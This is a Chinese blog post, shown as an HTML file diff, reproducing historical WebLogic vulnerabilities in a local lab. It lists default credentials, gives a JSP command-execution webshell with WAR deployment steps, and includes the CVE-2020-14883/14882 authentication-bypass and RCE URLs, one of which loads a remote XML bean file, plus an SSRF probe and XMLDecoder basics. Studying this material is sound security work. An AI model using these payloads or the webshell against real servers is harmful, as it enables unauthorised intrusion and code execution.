@@ -1,0 +1,311 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Weblogic学习2-一些历史漏洞的复现 | jmx0hxq's blog</title><meta name="author" content="Jmx0hxq"><meta name="copyright" content="Jmx0hxq"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Weblogic 弱口令&amp;&amp;文件上传&#x2F;console路由:常见弱口令:     账户 密码     system password   weblogic weblogic   guest guest   portaladmin portaladmin   admin security   joe password   mary password   system security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic学习2-一些历史漏洞的复现">
+<meta property="og:url" content="http://example.com/2024/04/06/Weblogic%E5%AD%A6%E4%B9%A02/index.html">
+<meta property="og:site_name" content="jmx0hxq&#39;s blog">
+<meta property="og:description" content="Weblogic 弱口令&amp;&amp;文件上传&#x2F;console路由:常见弱口令:     账户 密码     system password   weblogic weblogic   guest guest   portaladmin portaladmin   admin security   joe password   mary password   system security">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/assets/sbpk/3.jpg">
+<meta property="article:published_time" content="2024-04-05T16:30:09.889Z">
+<meta property="article:modified_time" content="2024-04-05T16:31:00.379Z">
+<meta property="article:author" content="Jmx0hxq">
+<meta property="article:tag" content="JAVA安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/assets/sbpk/3.jpg"><link rel="shortcut icon" href="/assets/favicon.png"><link rel="canonical" href="http://example.com/2024/04/06/Weblogic%E5%AD%A6%E4%B9%A02/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":800},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Weblogic学习2-一些历史漏洞的复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-06 00:31:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/jmx0hxq.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/assets/sbpk/3.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="jmx0hxq's blog"><span class="site-name">jmx0hxq's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Weblogic学习2-一些历史漏洞的复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-05T16:30:09.889Z" title="发表于 2024-04-06 00:30:09">2024-04-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-05T16:31:00.379Z" title="更新于 2024-04-06 00:31:00">2024-04-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Weblogic学习2-一些历史漏洞的复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Weblogic-弱口令-amp-amp-文件上传"><a href="#Weblogic-弱口令-amp-amp-文件上传" class="headerlink" title="Weblogic 弱口令&amp;&amp;文件上传"></a>Weblogic 弱口令&amp;&amp;文件上传</h2><p>/console路由:<br>常见弱口令:</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>账户</th>
+<th>密码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>system</td>
+<td>password</td>
+</tr>
+<tr>
+<td>weblogic</td>
+<td>weblogic</td>
+</tr>
+<tr>
+<td>guest</td>
+<td>guest</td>
+</tr>
+<tr>
+<td>portaladmin</td>
+<td>portaladmin</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>security</td>
+</tr>
+<tr>
+<td>joe</td>
+<td>password</td>
+</tr>
+<tr>
+<td>mary</td>
+<td>password</td>
+</tr>
+<tr>
+<td>system</td>
+<td>security</td>
+</tr>
+<tr>
+<td>wlcsystem</td>
+<td>wlcsystem</td>
+</tr>
+<tr>
+<td>wlcsystem</td>
+<td>sipisystem</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>其他常见密码<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">weblogic1  </span><br><span class="line">weblogic12  </span><br><span class="line">weblogic123  </span><br><span class="line">weblogic@123  </span><br><span class="line">webl0gic  </span><br><span class="line">weblogic#  </span><br><span class="line">weblogic@</span><br></pre></td></tr></table></figure></p>
+<p>上传war包RCE:<br>随便写一句话木马<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%  Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>打包<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvf test.war test.jsp</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405230656.png" alt="image.png"><br>先锁定并编辑,部署,安装<br>上传文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405230738.png" alt="image.png"><br>一直下一步.完成,先左上角点激活更改<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405230823.png" alt="image.png"><br>再回到部署把test启动<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405230855.png" alt="image.png"><br>此时访问127.0.0.1:7001/test/test.jsp<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405231344.png" alt="image.png"><br>成功执行命令,也可以修改jsp文件来让命令执行结构回显到网页上</p>
+<h2 id="Weblogic-未授权-amp-amp-后台RCE"><a href="#Weblogic-未授权-amp-amp-后台RCE" class="headerlink" title="Weblogic 未授权&amp;&amp;后台RCE"></a>Weblogic 未授权&amp;&amp;后台RCE</h2><h3 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h3><p>没有登录weblogic访问/console会302跳转登录页面/console/login/LoginForm.jsp<br>但是我们可以通过双重URL编码来绕过认证未授权访问console后台</p>
+<p>受影响版本<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
+<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405232201.png" alt="image.png"><br>或者浏览器抓包改包<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405232229.png" alt="image.png"></p>
+<h3 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h3><p>此时后台权限比较低,不能安装应用,需要CVE-2020-14882来允许后台任意用户通过 HTTP 协议执行任意命令。</p>
+<h4 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h4><p>借助<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类, Weblogic 12.2.1 及以上版本才有这个类,低版本不能用<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:7001/console/console.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;);&quot;)</span><br></pre></td></tr></table></figure></p>
+<h4 id="方式2"><a href="#方式2" class="headerlink" title="方式2"></a>方式2</h4><p>借助<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>类,对所有weblogic版本都可用</p>
+<p>先准备一个xml文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>url:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://127.0.0.1:4444/exp.xml&quot;)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405233121.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405233146.png" alt="image.png"></p>
+<h2 id="Weblogic-SSRF"><a href="#Weblogic-SSRF" class="headerlink" title="Weblogic SSRF"></a>Weblogic SSRF</h2><p>CVE-2014-4210<br>影响版本:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- Oracle WebLogic Server 10.0.2, 10.3.6</span><br></pre></td></tr></table></figure><br>SearchPublicRegistries.jsp接口存在SSRF漏洞<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405233924.png" alt="image.png"><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405234036.png" alt="image.png"></p>
+<p>看到报错<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">An error has occurred  </span><br><span class="line">weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found). Please ensure that your URL is correct, and the web service has deployed without error.</span><br></pre></td></tr></table></figure><br>访问7000端口<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405234338.png" alt="image.png"><br>此时回显不同可以探测内网信息</p>
+<h2 id="Weblogic-XMLDecoder"><a href="#Weblogic-XMLDecoder" class="headerlink" title="Weblogic XMLDecoder"></a>Weblogic XMLDecoder</h2><h3 id="xml基础"><a href="#xml基础" class="headerlink" title="xml基础"></a>xml基础</h3><p>XMLDecoder和XMLEncoder是jdk自带的内置包<br>语法:<br>XMLEncoder:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.beans.XMLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">XMLEncoder</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLEncoder</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.xml&quot;</span>)));</span><br><span class="line">        e.writeObject(<span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;Hello, world&quot;</span>));</span><br><span class="line">        e.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>结果:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_201&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.swing.JButton&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello, world<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>XMLDecoder:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">decode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">XMLDecoder</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.xml&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> d.readObject();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">        d.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.swing.JButton[,0,0,0x0,invalid,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@41cf53f9,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=14,bottom=2,right=14],paintBorder=true,paintFocus=true,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Hello, world,defaultCapable=true]</span><br></pre></td></tr></table></figure></p>
+<p>几个标签:</p>
+<ul>
+<li>string标签: <code>&lt;string&gt;Hello, world&lt;/string&gt;</code></li>
+<li>object标签: 表示对象,class属性指定具体类,method指定具体方法<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.swing.JButton&quot;</span> <span class="attr">method</span>=<span class="string">&quot;new&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,xml<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>void标签表示函数调用和赋值<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JButton</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>();</span><br><span class="line">b.setText(<span class="string">&quot;Hello, world&quot;</span>);</span><br></pre></td></tr></table></figure>
+可以对应:<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.swing.JButton&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;setText&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,xml<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>array标签: 表示数组,class表示具体类,内部void标签的index属性表示根据指定数组索引赋值<br>eg.<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3>WebLogic 存在 WLS-WebServices 的组件皆会受到影响<br>此组件路径:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat </span><br><span class="line">Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war </span><br><span class="line">Middleware/wlserver_10.3/server/lib/wls-wsat.war</span><br></pre></td></tr></table></figure>
